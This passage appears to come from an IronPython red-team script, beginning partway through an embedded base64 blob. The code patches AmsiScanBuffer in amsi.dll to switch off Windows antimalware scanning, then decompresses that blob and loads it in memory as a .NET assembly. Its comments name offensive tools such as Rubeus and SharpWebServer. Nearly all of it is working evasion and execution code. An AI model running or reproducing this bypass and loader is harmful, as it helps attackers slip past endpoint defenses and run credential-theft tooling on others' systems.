oYnEYH4HL9mFxb+7eFXj1698t9+4SgYsUrNHl9bnhesMODfnDk+M3McxsTq2/DXm5fBA1BzM8dPQNT35qXyC5U5h4rAZr5OQ+3iicrM2hwMyZdXXl6EXuHQqcpx5+XVL2aW+XFhqQIjQsInkFU4vITswsEZiF6bW/0agihuYLxVKOk4sufq19BYB/gEGAVbtLzgqAVsCZANBNzOzN94HNaDu35/Y9R0g9jz+zu7oT+MHICbIbhNR/1O7e7Gzu2w3nOHfrj33iM3jADwxv6V2lVAsfw9k3TLi4Ju/eAuPK5inopJqQDsMUeZfz//7//lz/EXy7gHf99/5KjvX7MA4N/LKv3vwfat7X/30/m/2PqvJ2//g1++dOUnf/InHua4df2r+lcXv4q+2t6th8Fjt7Hthvtu+JXfePLVA7fr1iN3LKkWtBrqjx8lxf0phitq6r9/8siu1jc3/XBj5G7VPZgwoqYfum6t1e1y4v97W1V+Mh3Lb/89478Z4oMKLEG+D7/34Ted7tA8fW1KPP4bizTwuxnw/wsY8h/+bUe1ZpKU1swV+H6kttU38L2hHkBoE7j2Ljxvwvdt4mCl/sOxv/6/Go/97xP5PaYmU29R3CNaZ9wW+/qmEq8N+PdDyrVD1rU+6beJdsP//tWx/+wgjm3FHgZ40HMS0z8jmAvmcwUWexcg/j2gr2Pgb6m072hSDtAf4Bcs2EeK/Q4TmAugZyV/CiBPA/ym0bPY8+Cu4mOtCmrMxyEC9Zjsp9sqeTcD3xPoEt4fUR3vKJfWY111k9ZaByp5zy3X7y6Vd0/itaeDrm//yOVeofbepwUy6tJoRR9v9Xibr1GedcWeuz1aUh9A7YryHWs66n9azPHX//4/fvTJqNet7IuwPXuxduFsxe03/ZbX79w4+3DndvXa2UoU1/utetfvuzfOHrjR2U8+Pnni5ImP6lHk9hrdgwqg6Ec3zg7C/vWouev26lG15zVDP/LbcbXp967Xo15t/+LZSq/e99puFD+yywNklYpBttly+7EXH6TqhJ+zlT6I+Rtntw7Wg6DrNes4j9TqQXD2PGOIw0EUb/bbfsn6XOKSIWfkNgchlCnPEBO6TwdQT7d1P/T2va7bcaOSWC+fNVhsPCDNmwOs8R133+1Wuvh942w92uzv+3tueLYy8NabTTeCAtr1buRKowjJ+Sm10VU/n6r7R+cNEeD5o/OaqB9PiIvf/rvvqJfg588/+HVX5Lf/fh3//j/84ccX"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpWebServer.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()